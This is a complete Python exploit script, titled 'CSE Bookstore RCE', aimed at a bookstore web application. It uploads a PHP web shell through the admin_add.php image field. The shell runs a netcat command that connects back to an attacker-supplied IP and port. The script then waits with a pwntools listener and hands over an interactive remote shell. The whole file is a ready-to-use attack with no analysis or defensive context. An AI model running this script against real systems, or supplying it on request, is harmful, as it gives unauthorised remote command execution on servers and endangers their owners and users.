import requests
import sys
import socket
import argparse
from pwn import listen

parser = argparse.ArgumentParser(description='---- CSE Bookstore RCE ----\n')
parser.add_argument('-u', dest='url', required=True, help='The url of the Target')
parser.add_argument('-l', dest='lhost', required=True, help='The IP of the Attacker')
parser.add_argument('-p', dest='lport', type=int ,required=True, help='The listening Port')
args = parser.parse_args()
url = args.url
lhost = args.lhost
lport = args.lport

payload = f'<?php system("nc {lhost} {lport} -e sh"); ?>'
file = {'image': ('webshell.php', payload, 'text/php')}

print('[+] Uploading Shell...\n')
r = requests.post(url + '/admin_add.php', files=file, data={'add':'1'}, verify=False)

print(f'[+] Starting Listener...')

lp = listen(lport)
lp.wait_for_connection()
lp.interactive()
